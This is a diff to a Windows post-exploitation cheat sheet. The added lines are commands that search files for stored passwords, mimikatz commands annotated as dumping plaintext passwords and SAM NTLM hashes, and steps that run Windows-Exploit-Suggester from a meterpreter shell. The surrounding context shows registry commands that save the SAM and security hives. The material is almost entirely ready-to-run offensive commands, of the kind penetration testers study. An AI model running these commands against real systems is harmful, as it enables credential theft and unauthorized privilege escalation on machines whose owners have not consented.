@@ -62,6 +62,13 @@ whoami /all
 taskkill /f /pid 7236  
 taskkill /f /im "Taskmgr.exe"  
 
+## Finding password
+findstr /si password \*.txt  
+findstr /si password \*.xml  
+findstr /si password \*.ini  
+findstr /spin "password" *.* -  
+
+
 ## Dump password from SAM file with registry
 reg.exe save hklm\sam c:\temp\sam.save  
 reg.exe save hklm\security c:\temp\security.save  
@@ -119,11 +126,20 @@ unzip mimikatz_trunk.zip
 (msf) upload /opt/x64/mimilib.dll .  
 (msf) session -i <id>  
 mimikatz.exe  
-(mimikatz) privilege::debug  
-(mimikatz) sekurlsa::logonPasswords full  
+(mimikatz) privilege::debug  #gives the admin debug privs  
+(mimikatz) sekurlsa::logonPasswords full  #Dump most plaintext passwords  
 (mimikatz) token::evelate  
-(mimikatz) lsadump::sam  
-(mimikatz) lsadump::sam /system:..\SystemBkup.hiv /sam:..\SamBkup.hiv
+(mimikatz) lsadump::sam  #Dump SAM NTLM hashes  
+(mimikatz) lsadump::sam /system:..\SystemBkup.hiv /sam:..\SamBkup.hiv  
+
+## Suggesting vulnerability to local exploit
+meterpreter> shell
+C:> systeminfo > sysinfo.txt
+git clone https://github.com/GDSSecurity/Windows-Exploit-Suggester
+cd Windows-Exploit-Suggester  
+./windows-exploit-suggester.py --update  
+./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt  
+
 
 ## Dump the hash
 reg.exe save hklm\sam c:\temp\sam.save
@@ -285,3 +301,4 @@ powershell "get-adgroup -filter {GroupCategory -eq 'Security' -AND Name -like '\
 - http://www.handgrep.se/repository/cheatsheets/postexploitation/WindowsPost-Exploitation.pdf  
 - https://www.attackdebris.com/?p=470  
 - https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf  
+- https://github.com/togie6/Windows-Privesc/blob/master/windows%20privesc%20sectalks%20BNE0x19.pdf  
